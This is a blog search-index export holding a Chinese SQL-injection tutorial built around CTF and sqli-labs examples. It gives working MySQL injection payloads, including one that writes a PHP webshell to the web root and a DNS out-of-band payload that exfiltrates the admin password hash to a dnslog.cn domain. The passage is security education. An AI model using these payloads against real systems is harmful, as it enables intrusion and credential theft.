<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>通过mysql学习sql注入</title>
      <link href="/2023/05/31/%E9%80%9A%E8%BF%87Mysql%E5%AD%A6%E4%B9%A0sql%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/05/31/%E9%80%9A%E8%BF%87Mysql%E5%AD%A6%E4%B9%A0sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h2><p>服务器将<strong>用户提交的参数</strong>错误地<strong>拼接到sql语句中</strong>，<strong>打破了数据区域的边界（数字型不需要）改变了原有的sql执行逻辑</strong>，导致攻击者可以执行恶意的sql语句。</p><p>简单的例子</p><p>假设</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select * from users where id=&#x27;<span class="subst">$id</span>&#x27;;&quot;</span></span><br></pre></td></tr></table></figure><p>用户提交</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27; and 1=1 #</span></span><br></pre></td></tr></table></figure><p>拼接后的sql语句</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from users where id=&#x27;1&#x27; and 1=1 #&#x27;</span><br></pre></td></tr></table></figure><p>要进行注入，只需要将<code>and 1=1</code>部分替换为其他sql语句即可。</p><blockquote><p>其实分析<code>sqlmap</code>的注入也是如此，注入语句由<code>prefix</code>，<code>payload</code>和<code>suffix</code>组成</p></blockquote><p>图来源<a href="https://www.freebuf.com/column/161797.html">https://www.freebuf.com/column/161797.html</a></p><p><img src="/../images/image-20230522131723064.png" alt="image-20230522131723064"></p><h2 id="漏洞危害–攻击面"><a href="#漏洞危害–攻击面" class="headerlink" title="漏洞危害–攻击面"></a>漏洞危害–攻击面</h2><ul><li><p>拿到敏感信息，如手机号，身份证，邮箱，家庭地址等</p></li><li><p>后台账号</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">万能密码？这年头还有吗🤔</span><br><span class="line">拿到密码，但是一般密码都是加盐再加密的了吧，需要彩虹表啥的。</span><br><span class="line">或者堆叠注入创建一个，修改一个等                       </span><br></pre></td></tr></table></figure></li><li><p>文件任意读取</p></li><li><p>Getshell</p></li><li><p>RCE</p></li><li><p>提权</p></li></ul><h2 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p><img src="/../images/image-20230522131900429.png" alt="image-20230522131900429"></p><h4 id="站库分离"><a href="#站库分离" class="headerlink" title="站库分离"></a>站库分离</h4><h5 id="为什么"><a href="#为什么" class="headerlink" title="为什么"></a>为什么</h5><p>站库分离，所以不能通过数据库进行读写</p><h5 id="判断方法"><a href="#判断方法" class="headerlink" title="判断方法"></a>判断方法</h5><ul><li><p>通用方法</p><p>读取配置文件，判断IP</p></li><li><p>Mysql</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select @@hostname; //服务端主机名称 select * from information_schema.PROCESSLIST; //客户端主机名称和端口</span><br></pre></td></tr></table></figure><blockquote><p>Windows连接格式：主机名:Port</p><p>Linux连接格式：IP:Port</p><p>本地连接格式：localhost:Port</p></blockquote><p><img src="/../images/image-20230522203905326.png" alt="image-20230522203905326"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select user()；</span><br></pre></td></tr></table></figure><blockquote><p>如果不是localhost，大概率是站库分离。</p></blockquote><p><img src="/../images/image-20230522204233420.png" alt="image-20230522204233420"></p></li></ul><h4 id="数据库类型"><a href="#数据库类型" class="headerlink" title="数据库类型"></a>数据库类型</h4><p><img src="/../images/image-20230519205623244-1685603526750.png"></p><h4 id="各种信息"><a href="#各种信息" class="headerlink" title="各种信息"></a>各种信息</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># ifnull(@@secure_file_priv,0) secure_file_priv为空时返回0,不为空时返回其值</span><br><span class="line">SELECT concat_ws(0x0a,</span><br><span class="line">ifnull(@@secure_file_priv,0),</span><br><span class="line">concat_ws(0xefbc8c, @@version, @@version_compile_os, @@version_compile_machine, @@version_comment),</span><br><span class="line">concat_ws(0xefbc8c, @@hostname, @@port),</span><br><span class="line">concat_ws(0xefbc8c, user(), database()),</span><br><span class="line">concat_ws(0xefbc8c, @@datadir, @@plugin_dir, @@tmpdir, @@basedir)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 结果</span><br><span class="line">0</span><br><span class="line">10.5.8-MariaDB-3，debian-linux-gnu，x86_64，Debian buildd-unstable</span><br><span class="line">kali，3306</span><br><span class="line">root@localhost</span><br><span class="line">/var/lib/mysql/，/usr/lib/mysql/plugin/，/tmp，/usr</span><br></pre></td></tr></table></figure><h3 id="判断"><a href="#判断" class="headerlink" title="判断"></a>判断</h3><h4 id="注入点"><a href="#注入点" class="headerlink" title="注入点"></a>注入点</h4><p>一切与数据库有交互的地方，取决于后端从HTTP请求报文中提取了什么数据并拼接到sql语句中。</p><h4 id="是否存在sql注入"><a href="#是否存在sql注入" class="headerlink" title="是否存在sql注入"></a>是否存在sql注入</h4><ul><li><p>字符型or数字型：fuzz闭合类型</p></li><li><p>是否有报错，是否能逃逸执行sql语句（逻辑，延时等判断）</p></li></ul><h4 id="后端语句"><a href="#后端语句" class="headerlink" title="后端语句"></a>后端语句</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 得到后端执行的sql语句</span><br><span class="line">select * from test.users where id=1 union SELECT (select INFO FROM INFORMATION_SCHEMA.PROCESSLIST WHERE INFO LIKE &#x27;%673245283%&#x27; LIMIT</span><br><span class="line"> 1),2,3;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230528210843123.png" alt="image-20230528210843123"></p><h3 id="Mysql注入手段"><a href="#Mysql注入手段" class="headerlink" title="Mysql注入手段"></a>Mysql注入手段</h3><h4 id="admin登入"><a href="#admin登入" class="headerlink" title="admin登入"></a>admin登入</h4><ul><li><p>万能密码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 后端代码Demo</span></span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;SELECT * FROM manage WHERE user=&#x27;<span class="subst">$user</span>&#x27; and passwd=&#x27;<span class="subst">$passwd</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$query</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;登陆成功&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过布尔运算让where恒为真</p><p><img src="/../images/image-20230312212035948.png" alt="image-20230312212035948"></p></li><li><p>注册覆盖</p><blockquote><p>admin (有个空格)或者 (有个空格)admin</p><p>原理：用户名字段长度&gt;5，所以可以添加空格，而sql语句执行时会将空格忽略。</p></blockquote><p><img src="/../images/image-20230312210909402.png" alt="image-20230312210909402"></p></li><li><p>联合查询构造临时用户</p><p><code>[GXYCTF2019]BabySQli</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 后端代码Demo</span></span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;SELECT * FROM manage WHERE user=&#x27;<span class="subst">$user</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$query</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;SQL语句有误：&#x27;</span>.<span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line"><span class="variable">$users</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">mysql_num_rows</span>(<span class="variable">$result</span>)) &#123;  </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;Script language=JavaScript&gt;alert(&#x27;抱歉，用户名或者密码错误。&#x27;);history.back();&lt;/Script&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$passwords</span>=<span class="variable">$users</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>)&lt;&gt;<span class="variable">$passwords</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;Script language=JavaScript&gt;alert(&#x27;抱歉，用户名或者密码错误。&#x27;);history.back();&lt;/Script&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;登陆成功&quot;</span>;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=admin&#x27; union select 1,&#x27;admin&#x27;,&#x27;c4ca4238a0b923820dcc509a6f75849b&#x27; limit 1,2--+</span><br><span class="line"></span><br><span class="line">passwd=c4ca4238a0b923820dcc509a6f75849b</span><br><span class="line"></span><br><span class="line">MD5(1)=c4ca4238a0b923820dcc509a6f75849b</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230312215147770.png" alt="image-20230312215147770"></p></li></ul><h4 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h4><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>sql语句为<code>select</code>,页面有回显查询结果。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users where id=<span class="subst">$id</span> &quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your Login name:&#x27;</span>. <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span> .<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>];</span><br></pre></td></tr></table></figure><h5 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h5><p><strong>先通过order by等语句判断列数，再判断哪一列是输出点，最后进行注入</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">联合查询，获取库名</span><br><span class="line">?id=-1&quot;union select 1,2,group_concat(schema_name),3 from information_schema.schemata#</span><br><span class="line"></span><br><span class="line">联合查询，获取表名 </span><br><span class="line">?id=-1&quot;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;已知库名&#x27;#</span><br><span class="line"></span><br><span class="line">?id=-1&quot;union select 1,2,group_concat(table_name) from mysql.innodb_table_stats where database_name=&#x27;已知库名&#x27;#</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">联合查询，获取字段名</span><br><span class="line">?id=-1&quot;union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;已知表名&#x27;#</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">联合查询，获取字段值</span><br><span class="line">?id=-1&quot;union select 1,2,group_concat(字段1，字段2...) from 已知表名#</span><br></pre></td></tr></table></figure><blockquote><p>注意：</p><p>因为后端查询语句可能只拿第一行查询结果如<code>$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</code>，所以需要构造一个不存在的值如-1，使得联合查询的结果成为第一行；</p><p>要查的表的名称(这个表是不是在现在使用的数据库中，没有的话表名&#x3D;数据库.表名)</p></blockquote><h4 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h4><h5 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h5><blockquote><p>后端使用的查询函数为<code>mysqli_multi_query()</code> ，支持多条语句查询</p><p>而不是<code>mysqli_query()</code> ，仅支持一条语句查询</p></blockquote><h5 id="局限性"><a href="#局限性" class="headerlink" title="局限性"></a>局限性</h5><ul><li><p>并不是每一个环境下都可以执行，可能受到 API 或者数据库引擎的影响</p></li><li><p>无回显：在 Web 中代码通常只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略</p><p><strong>解决方法</strong>：可以通过先将内容插入到数据库中，然后再通过查询查出来</p></li></ul><h5 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27;;sql语句;--+</span></span><br></pre></td></tr></table></figure><p>可以任意执行sql语句，危害很大</p><h6 id="配合handle绕过关键字"><a href="#配合handle绕过关键字" class="headerlink" title="配合handle绕过关键字"></a>配合handle绕过关键字</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">handler 表名  open ; handler 表名 read first; #打开表；读取第一条数据</span><br><span class="line">handler 表名 read next;#与上一条语句一起用，读取下一条即第二条数据</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/qq_43427482/article/details/109898934">【MySQL】MySQL 之 handler 的详细使用及说明</a></p><h6 id="配合预编译语句绕过"><a href="#配合预编译语句绕过" class="headerlink" title="配合预编译语句绕过"></a>配合预编译语句绕过</h6><p>使用格式</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set @tn = &#x27;hahaha&#x27;;  //存储表名</span><br><span class="line">set @sql = concat(&#x27;select * from &#x27;, @tn);  //存储SQL语句</span><br><span class="line"></span><br><span class="line">prepare query from @sql;   //预定义SQL语句</span><br><span class="line"></span><br><span class="line">execute query;  //执行预定义SQL语句</span><br><span class="line"></span><br><span class="line">(DEALLOCATE || DROP) prepare sqla;  //删除预定义SQL语句</span><br></pre></td></tr></table></figure><h5 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h5><p>[SUCTF 2018]MultiSQL</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set @sql=select &#x27;&lt;?php eval($_POST[khaz]);?&gt;&#x27; into outfile &#x27;/var/www/html/favicon/shell3.php&#x27;;prepare name from @sql;execute name;</span><br></pre></td></tr></table></figure><p>转换脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&quot;select &#x27;&lt;?php eval($_POST[khaz]);?&gt;&#x27; into outfile &#x27;/var/www/html/favicon/shell3.php&#x27;&quot;</span></span><br><span class="line">b = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    b.append(<span class="built_in">str</span>(<span class="built_in">ord</span>(i)))</span><br><span class="line">c=<span class="string">&#x27;,&#x27;</span>.join(b)</span><br><span class="line">res = <span class="string">&#x27;char(&#123;&#125;)&#x27;</span>.<span class="built_in">format</span>(c)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set @sql=char(117,112,100,97,116,101,32,115,99,111,114,101,32,115,101,116,32,108,105,115,116,101,110,61,50,48,48);prepare query from @sql;execute query;</span><br></pre></td></tr></table></figure><h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><h5 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h5><p><strong>使用<code>mysql_error()</code>函数，可以返回上一个Mysql操作产生的文本错误信息。</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$con</span> = <span class="title function_ invoke__">mysql_connect</span>(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;wrong_user&quot;</span>,<span class="string">&quot;wrong_pwd&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$con</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line">&#125;</span><br><span class="line">&gt;&gt;</span><br><span class="line">Access denied <span class="keyword">for</span> user <span class="string">&#x27;wrong_user&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span></span><br><span class="line">(using password: YES)</span><br></pre></td></tr></table></figure><h5 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h5><p>最常用的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Xpat语法错误，报错信息是有长度限制的，最大长度限制32位,配合substr()等截取字符串函数使用</span><br><span class="line">select extractvalue(1,concat(0x7e,(select user()),0x7e));</span><br><span class="line">select updatexml(1,concat(0x7e,(select user()),0x7e),1);</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230523184243091.png" alt="image-20230523184243091"></p><p>其他<a href="https://hatboy.github.io/2018/08/28/MySQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/">MySQL报错注入 </a></p><h5 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">原型：</span><br><span class="line">?id=1&quot;or(updatexml(1,concat(0x7e,(),0x7e),1))--+</span><br><span class="line"></span><br><span class="line">爆库:</span><br><span class="line">?id=1&quot;or(updatexml(1,concat(0x7e,(select(substr(group_concat(schema_name),1,32))from (information_schema.schemata)),0x7e),1))--+</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">爆表：</span><br><span class="line">id=1&quot;or(updatexml(1,concat(0x7e,(select(substr(group_concat(table_name),1,32))from (information_schema.tables)where(table_schema=&#x27;已知库名&#x27;)),0x7e),1))--+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">爆列名：</span><br><span class="line">id=1&quot;or(updatexml(1,concat(0x7e,(select( substr(group_concat(column_name),1,32)))from(information_schema.columns)where(table_name=&#x27;flag&#x27;))),1))--+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">爆字段值</span><br><span class="line">id=1&quot;or(updatexml(1,concat(0x7e,(select( substr(group_concat(real_flag_1s_here),1,6)))from(users))),1))--+</span><br></pre></td></tr></table></figure><h4 id="二次注入–存储型注入"><a href="#二次注入–存储型注入" class="headerlink" title="二次注入–存储型注入"></a>二次注入–存储型注入</h4><h5 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h5><p><img src="/../images/1.png" alt="ctf1"></p><p>常见转义函数</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">addslashes</span>()</span><br><span class="line"><span class="title function_ invoke__">mysql_escape_string</span>()</span><br></pre></td></tr></table></figure><p>以<code>sql-labs Less-24</code>为例</p><p>创建用户</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$username</span>=  <span class="title function_ invoke__">mysql_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) ;</span><br><span class="line"><span class="variable">$pass</span>= <span class="title function_ invoke__">mysql_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"><span class="variable">$re_pass</span>= <span class="title function_ invoke__">mysql_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;re_password&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;insert into users ( username, password) values(\&quot;<span class="subst">$username</span>\&quot;, \&quot;<span class="subst">$pass</span>\&quot;)&quot;</span>;</span><br></pre></td></tr></table></figure><p>使用不恰当的函数<code>mysql_escape_string</code>，功能为在 MySQL 中具有特殊含义的字符（如单引号、双引号、反斜杠和空字节）前添加反斜杠字符。所以脏数据还是进入到了数据库中。</p><p>修改密码处</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$sql = &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;$username&#x27; and password=&#x27;$curr_pass&#x27; &quot;;</span><br></pre></td></tr></table></figure><p>直接将脏数据取出并拼接到sql语句中，造成了sql注入。</p><h5 id="常见场景"><a href="#常见场景" class="headerlink" title="常见场景"></a>常见场景</h5><p>将保存的脏数据从数据库中取出，再次进行sql操作的场景。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">修改密码</span><br><span class="line">修改订单</span><br><span class="line">总之就是修改已保存信息的地方</span><br></pre></td></tr></table></figure><h5 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h5><h6 id="CISCN2019-华北赛区-Day1-Web5-CyberPunk"><a href="#CISCN2019-华北赛区-Day1-Web5-CyberPunk" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web5]CyberPunk"></a>[CISCN2019 华北赛区 Day1 Web5]CyberPunk</h6><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$address</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&quot;address&quot;</span>]);<span class="comment">#可控变量</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)&quot;</span>;<span class="comment">#将$_POST[&quot;address&quot;]保存到数据库中</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$row</span> = <span class="variable">$fetch</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();<span class="comment">#$row保存sql语句查询结果</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;update `user` set `address`=&#x27;&quot;</span>.<span class="variable">$address</span>.<span class="string">&quot;&#x27;, `old_address`=&#x27;&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;address&#x27;</span>].<span class="string">&quot;&#x27; where `user_id`=&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;user_id&#x27;</span>];<span class="comment">#调用了查询结果</span></span><br></pre></td></tr></table></figure><p>分析上面两条语句，对可控参数address只进行了转义处理，就保存到数据库中。</p><p>并且在update中引用了<code>$row[&#39;address&#39;]</code>，所以在这里存在二次注入。</p><p>可以看到列名为old_address，在进行修改时，会将旧地址保存下来，所以我们只要在第一次修改时，在address处注入恶意代码，第二次修改查询旧地址时就会执行恶意代码。</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#x27;/flag.txt&#x27;),1,20)),0x7e),1)# </span><br></pre></td></tr></table></figure><h4 id="盲注–无回显注入"><a href="#盲注–无回显注入" class="headerlink" title="盲注–无回显注入"></a>盲注–无回显注入</h4><p>推荐阅读：<a href="https://www.anquanke.com/post/id/266244">https://www.anquanke.com/post/id/266244</a></p><h5 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h5><p>页面无数据回显，但是有两种返回状态</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and 1=1 --+ # True</span><br><span class="line">?id=1&#x27; and 1=2 --+ # False</span><br></pre></td></tr></table></figure><p>实际</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and 1=子查询 --+  </span><br></pre></td></tr></table></figure><p>子查询&#x3D;字符串截取+比较</p><h6 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h6><p><code>and 1=</code></p><table><thead><tr><th align="center">逻辑连接符</th><th align="center">payload</th></tr></thead><tbody><tr><td align="center">或</td><td align="center">or ，||</td></tr><tr><td align="center">异或</td><td align="center">xor，^</td></tr><tr><td align="center">按位与&#x2F;或</td><td align="center">&amp;，|</td></tr></tbody></table><p>字符串截取</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 从start位置开始,截取len个字符</span><br><span class="line">substr(string,start,len)</span><br><span class="line">mid(string,start,len)</span><br><span class="line"></span><br><span class="line"># 从左/右截取len个字符</span><br><span class="line">left(string,len)</span><br><span class="line">right(string,len)</span><br></pre></td></tr></table></figure><p>比较</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">like binary 0x25&#123;&#125;&#123;&#125;25</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230505230426015.png" alt="image-20230505230426015"></p><blockquote><p>因为大小写不敏感，所以要用<code>binary</code></p><p>BINARY将16进制转化为字符串</p></blockquote><p>语法</p><table><thead><tr><th align="center">like</th><th align="center">正则</th></tr></thead><tbody><tr><td align="center">_</td><td align="center">.</td></tr><tr><td align="center">%</td><td align="center">.*</td></tr><tr><td align="center">[]</td><td align="center">[]</td></tr><tr><td align="center">[^]</td><td align="center">[^]</td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">regexp &quot;^a&quot;</span><br><span class="line">regexp &quot;^ab&quot;</span><br></pre></td></tr></table></figure><h5 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h5><p>时间盲注就是<strong>在布尔盲注上加了延迟时间函数sleep()</strong>,用在True和False回显难以区分时,通过页面的响应时间来判断布尔逻辑的正确与否。</p><h6 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(布尔,A,B)与三目运算符逻辑一样,加上sleep函数</span><br><span class="line"></span><br><span class="line">sleep(if(布尔,A,B))布尔正确,延迟A秒,布尔错误,延迟B秒</span><br><span class="line"></span><br><span class="line">或者 if(布尔,1,sleep(x))布尔正确,无延迟,布尔错误,延迟x秒</span><br></pre></td></tr></table></figure><p>![image-20230312232840696](..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;typora img&#x2F;image-20230312232840696.png)</p><h6 id="绕过-1"><a href="#绕过-1" class="headerlink" title="绕过"></a>绕过</h6><p>能造成延时效果的语句</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 通过执行多次命令形成延时</span><br><span class="line">benchmark(执行次数,sql语句)</span><br><span class="line"></span><br><span class="line"># 查询一些数据量比较大的表做笛卡尔集运算，导致查询缓慢</span><br><span class="line">select * from tab1 cross join tab2;</span><br><span class="line">select * from tab1,tab2;</span><br></pre></td></tr></table></figure><h5 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h5><p>盲注都是需要脚本的，或者用sqlmap</p><h4 id="DNS外带注入"><a href="#DNS外带注入" class="headerlink" title="DNS外带注入"></a>DNS外带注入</h4><p>推荐阅读：<a href="https://www.anquanke.com/post/id/98096">Dnslog在SQL注入中的实战-安全客 - 安全资讯平台</a></p><h5 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h5><ol><li><p>MySQL Load_File()函数可以发起请求，使用Dnslog接收请求，获取数据；</p></li><li><p>windows下存在<code>UNC路径</code></p><blockquote><p>UNC是一种命名惯例, 主要用于在Microsoft Windows上指定和映射网络驱动器. UNC命名惯例最多被应用于在局域网中访问文件服务器或者打印机。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\\xxxx\xx</span><br></pre></td></tr></table></figure><p>   <img src="/../images/image-20230425175525555.png" alt="image-20230425175525555"></p><p>   <img src="/../images/image-20230425175452805.png" alt="image-20230425175452805"></p></li></ol><h5 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h5><ul><li>windows系统</li><li><code>secure_file_priv</code>为空</li></ul><h5 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,load_file(CONCAT(<span class="string">&#x27;\\\\&#x27;</span>,(<span class="keyword">SELECT</span> hex(passwd) <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span> LIMIT <span class="number">1</span>),<span class="string">&#x27;.mysql.2fzz61.dnslog.cn\\abc&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">-- Hex编码的目的是减少干扰，域名有一定的规范，有些特殊字符不能带入</span></span><br><span class="line"><span class="comment">-- \\\\转义  →  \\</span></span><br></pre></td></tr></table></figure><h4 id="SMB外带注入"><a href="#SMB外带注入" class="headerlink" title="SMB外带注入"></a>SMB外带注入</h4><p><a href="http://www.moonslow.com/article/smb_sql_injection">http://www.moonslow.com/article/smb_sql_injection</a></p><h4 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h4><h5 id="原理-5"><a href="#原理-5" class="headerlink" title="原理"></a>原理</h5><p>From:<a href="https://cloud.tencent.com/developer/article/1938545">https://cloud.tencent.com/developer/article/1938545</a></p><p>宽字节：如果一个字符的大小是两个字节的，该字符称为宽字节字符</p><p><code>PHP</code>与<code>Mysql</code>之间的交互</p><p><img src="/../images/5917903e25c36c63ec29ad5237c2f7a4.png" alt="img"></p><p>将php的sql语句以<code>character_set_client</code>编码（也就是转为16进制数），再将16进制数以<code>character_set_connection</code>进行编码（也就是转换为url编码），然后以内部操作字符集进行url解码，最后以<code>character_set_results</code>编码输出结果。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">%df%<span class="number">27</span> 浏览器url自动解码===&gt; β<span class="string">&#x27; 转义===&gt;β\&#x27;转为16进制===&gt; 0xdf0x5c0x27 转换为url编码===&gt; %df%5c%27 进行url解码(因为是GBK编码，%df和%5c结合为汉字)===&gt; 運&#x27;</span></span><br></pre></td></tr></table></figure><h5 id="例题-2"><a href="#例题-2" class="headerlink" 